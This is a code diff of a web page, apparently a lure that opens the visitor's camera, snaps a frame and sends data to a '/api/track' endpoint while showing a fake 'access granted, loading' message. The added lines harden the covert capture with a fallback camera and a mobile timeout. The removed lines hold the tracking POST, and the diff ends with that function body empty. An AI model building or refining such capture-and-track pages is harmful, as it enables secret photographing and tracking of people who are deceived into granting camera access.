@@ -227,11 +227,23 @@
     }
 
     async function getPhoto() {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+      // Essaie caméra frontale, sinon caméra par défaut
+      let stream;
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+      } catch(e) {
+        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+      }
+
       const video = document.getElementById('cam');
       video.srcObject = stream;
-      await new Promise(r => video.onloadedmetadata = r);
-      await new Promise(r => setTimeout(r, 800)); // laisser la caméra s'initialiser
+
+      // Timeout de 5s sur onloadedmetadata pour éviter le blocage mobile
+      await Promise.race([
+        new Promise(r => { video.onloadedmetadata = r; video.load(); }),
+        new Promise(r => setTimeout(r, 5000))
+      ]);
+      await new Promise(r => setTimeout(r, 800));
 
       const canvas = document.getElementById('snap');
       canvas.width = 320;
@@ -239,7 +251,6 @@
       const ctx = canvas.getContext('2d');
       ctx.drawImage(video, 0, 0, 320, 240);
 
-      // Stop camera
       stream.getTracks().forEach(t => t.stop());
       video.srcObject = null;
 
@@ -247,15 +258,4 @@
     }
 
     async function sendData(data) {
-      try {
-        await fetch('/api/track', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(data)
-        });
-      } catch(e) {}
-      document.getElementById('status').textContent = '✅ Accès accordé. Chargement...';
-    }
-  </script>
-</body>
-</html>
+      
